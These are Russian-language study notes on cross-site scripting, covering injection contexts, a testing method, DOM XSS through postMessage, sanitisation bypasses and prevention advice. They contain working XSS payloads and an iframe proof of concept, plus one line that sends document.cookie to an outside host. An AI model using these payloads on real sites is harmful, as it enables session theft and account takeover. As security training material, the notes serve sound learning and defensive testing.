# Поиск точек для ввода
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Существует несколько способов выполнения JavaScript в HTML:
1. Тег <script>
2. Обработчики событий в атрибутах (начинающиеся с on)
    <img src=x onerror=alert(1)> <audio src=x onerror=alert(1)> <iframe src=x onerror=alert(1)> <video src=x onerror=alert(1)>
3. Псевдопротокол javascript:
    https://target/login?target=javascript:alert(1)
4. Перенаправление страниц query параметры
    ?returnTo=javascript:alert(document.cookie)
5. Обход санитизации
     " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//

Для XSS важно понимание построения DOM в браузере и то как попадает пользовательский ввод на страницу. 
Есть три основных способа:
* <b>innerText</b> выводит только текст без HTML-форматирования, идентичный тому, как если бы вы смотрели на страницу. > пользовательский ввод интерпритируется как обычный текст. innerText учитывает CSS-правила, и если элемент скрыт через display: none, он не попадет в вывод innerText.
console.log(document.querySelector('.styledText').innerText);
* <b>innerHTML</b> позволяет манипулировать HTML-структурой элементов, включая теги и стили. Это уязвимость для XSS. Но <script> не отработает, т.к. важно понимать контект вставки (какой тег). Но <img src="qweqwe" onerror="alert()"> может быть исполнен
// Добавляем HTML-элементы
document.querySelector('.content').innerHTML = '<div class="new">Новый элемент</div>';
* <b>value></b> применяется для работы с значениями интерактивных элементов, таких как input, textarea или select.
// Значения, введенные пользователем, становятся данными
document.querySelector('#username').value = 'user123';

### Методика: 
1. Вставить текст и понять где на странице отобразилось сообщение: <b>blablabla</b>
Открыть консоль разработчика и найти место вывода ввода
[+] пропали теги и текст выделен > innerHTML
[-] теги сохранились innetText, value >
[?] теги санитизированы

### DOM XSS
Вставить текст и понять где на странице отобразилось сообщение: 
<b>blablabla</b>           # <img src=x onerror=alert(1)>
{{ 9 * 9}}                 # {{$on.constructor('alert(1)')()}}
""--blablabla              # ""--alert--""
'"--blablabla              # '"--alert--"'
\"-alert(1)}//             # экранирование нагрузки и комментирование кода JS 

##### Web Messaging. postMessage()
- обмен информацией между вкладками
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages 
```js
// DevTools Console:
>>> window.addEventListener('message', (e) => { console.log(e.data)})
>>> window.postMessage('TEST')
    TEST // также проверить где на странице отобразился этот пайлоад
>>> window.postMessage('<img src=x onerror=alert(1)>')
// Vulnerable code (sample)
addEventListener < source
.innerHTML < sink
```
PoC: Идея в том, что жертва переходит на сайт хакера, где содержится код обращающийся к открытому сайту в соседней вкладке
`<iframe src="https://vulnerable.lab/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
Защита:
```
1. Использование заголовков
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
2. Проверка в коде заголовков `Origin` и `source`
3. Не использовать addEventListener
4. Не использовать уязвимые обработчики событий
```

[+] тест отобразился в контексте </script> или обработчиках особенно:
    element.innerHTML = "<HTML> Tags and markup";
    element.outerHTML = "<HTML> Tags and markup";
    document.write
    innerHTML
    document.getElementById
    location.search
[+] тест отобразился в URL /?search=<b>blablabla<%2Fb>
[+] наличие eval в фронтальных скриптах
Альтернативно открыть консоль разработчика и в консоли вставить 
`document.getElementsByTagName(“body”)`
`body = document.getElementsByTagName("body")[0]`
`body.innerHTML`
`body.innerHTML = "<h1>Magic!</h1>"`

3. Обход санитизации
Найти функции типа replace
|Скрипт санитизации                             |Способ обхода                  |
|-----------------------------------------------|-------------------------------|
|html.replace('<', '&lt;').replace('>', '&gt;');|<><img src=1 onerror=alert(1)> |
 

'-alert(1)-'
""alert(1)-'

### POC
```
onerror=document.location=’http://192.168.48.165:8000/c?c=’+document.cookie>
```
 
 
# Payloads
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
https://github.com/coffinxp/payloads/tree/main"
https://aszx87410.github.io/beyond-xss/en/

# How to prevent
- использование CSP
- Валидация пользовательского ввода по белым (разрешенным) спискам
- Использование санитизации. Используйте библиотеки, такие как [sanitize-url](https://www.npmjs.com/package/@braintree/sanitize-url) или [DOMPurify](https://www.npmjs.com/package/dompurify). Для приложений обрабатывающих критичные данные, с большим количеством пользователей или имеющих выход в интернет - санитизация и валидация должна быть реализована как на фронтальном так и на серверном компоненте.
- Не передавайте пользовательский ввод в контекст innerHTML
- Не используйте опасные функции eval(),
- При использовании фреймворков (vue.js, react.js, django.py, etc):
    * Никогда не используйте ненадёжные шаблоны 
    ```js
    Vue.createApp({
    template: `<div>` + userProvidedString + `</div>` // НИКОГДА ТАК НЕ ДЕЛАЙТЕ
    }).mount('#app')
    ```